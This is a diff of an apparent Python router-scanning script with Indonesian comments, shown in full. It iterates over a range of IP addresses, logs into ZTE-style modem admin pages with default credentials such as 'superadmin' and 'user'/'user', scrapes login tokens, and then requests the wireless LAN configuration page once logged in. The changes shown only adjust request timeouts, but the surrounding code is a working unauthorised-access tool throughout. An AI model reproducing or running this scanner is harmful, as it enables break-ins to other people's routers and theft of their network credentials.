@@ -32,7 +32,7 @@ while hitung < 256:
             "Username": "superadmin",
             "Password": xpw
             }
-            log = requests.post('http://'+ip+'/', data=raw, allow_redirects=True, timeout=1-5)
+            log = requests.post('http://'+ip+'/', data=raw, allow_redirects=True, timeout=3)
             title = BeautifulSoup(requests.get('http://'+ip).content, 'html.parser').find('title').get_text()
             if 'http://'+ip+'/start.ghtml' == log.url:
                 getver = BeautifulSoup(requests.get('http://'+ip+'/template.gch', timeout=3).content, 'html.parser')
@@ -93,7 +93,7 @@ while hitung < 256:
         break
 # Untuk modem XSF609
     except AttributeError:
-        getoken = BeautifulSoup(requests.get('http://'+ip, timeout=10).content, 'html.parser')
+        getoken = BeautifulSoup(requests.get('http://'+ip, timeout=3).content, 'html.parser')
         token = str(getoken.find_all('script')[1]).split('getObj("Frm_Logintoken").value = "')[1].split('";')[0]
         xdata = {
             "frashnum": "",
@@ -102,7 +102,7 @@ while hitung < 256:
             "Username": "user",
             "Password": "user"
             }
-        gas = requests.post('http://'+ip, data=xdata, allow_redirects=False, timeout=10)
+        gas = requests.post('http://'+ip, data=xdata, allow_redirects=False, timeout=3)
         if gas.status_code == 302:
             req = requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_conf_t_user.gch')
             cari = BeautifulSoup(req.content, 'html.parser').find("form", {"name": "fSubmit"})
